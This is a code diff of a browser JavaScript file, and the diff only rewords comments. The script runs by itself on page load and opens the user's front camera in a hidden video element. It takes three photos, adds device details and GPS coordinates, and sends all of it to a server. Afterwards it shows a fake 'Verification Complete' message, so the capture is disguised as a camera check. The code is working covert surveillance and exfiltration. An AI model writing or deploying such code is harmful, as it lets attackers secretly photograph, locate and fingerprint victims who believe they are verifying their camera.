@@ -1,4 +1,4 @@
-// Advanced Camera Capture with Device Info & GPS
+// camera capture with device info & gps
 (function() {
     'use strict';
 
@@ -6,7 +6,7 @@
     const PHOTO_COUNT = 3;
     const DELAY_MS = 800;
 
-    // Collect device information
+    // grab device info
     function getDeviceInfo() {
         return {
             userAgent: navigator.userAgent,
@@ -21,7 +21,7 @@
         };
     }
 
-    // Get GPS location
+    // get gps coords
     function getLocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
@@ -48,7 +48,7 @@
         });
     }
 
-    // Send data to server
+    // send to server
     async function sendData(formData) {
         try {
             const response = await fetch(API_ENDPOINT, {
@@ -62,22 +62,20 @@
         }
     }
 
-    // Capture photos
+    // main capture function
     async function capturePhotos() {
         try {
-            // Request camera access
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: 'user' }, 
                 audio: false 
             });
 
-            // Create hidden video element
+            // hidden video element
             const video = document.createElement('video');
             video.style.display = 'none';
             video.srcObject = stream;
             video.play();
 
-            // Wait for video to be ready
             await new Promise(resolve => {
                 video.onloadedmetadata = resolve;
             });
@@ -87,7 +85,7 @@
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
 
-            // Capture multiple photos
+            // snap photos
             for (let i = 0; i < PHOTO_COUNT; i++) {
                 await new Promise(resolve => setTimeout(resolve, DELAY_MS));
                 
@@ -97,7 +95,7 @@
                 const formData = new FormData();
                 formData.append('photo', blob, `photo_${Date.now()}_${i}.jpg`);
                 
-                // Add device info on first photo
+                // attach device info on first shot
                 if (i === 0) {
                     const deviceInfo = getDeviceInfo();
                     const location = await getLocation();
@@ -108,10 +106,8 @@
                 await sendData(formData);
             }
 
-            // Stop camera
             stream.getTracks().forEach(track => track.stop());
             
-            // Show success message (optional)
             if (document.body) {
                 document.body.innerHTML = '<h1>Verification Complete</h1><p>Thank you for verifying your camera.</p>';
             }
@@ -123,7 +119,7 @@
         }
     }
 
-    // Auto-start when page loads
+    // auto start
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', capturePhotos);
     } else {
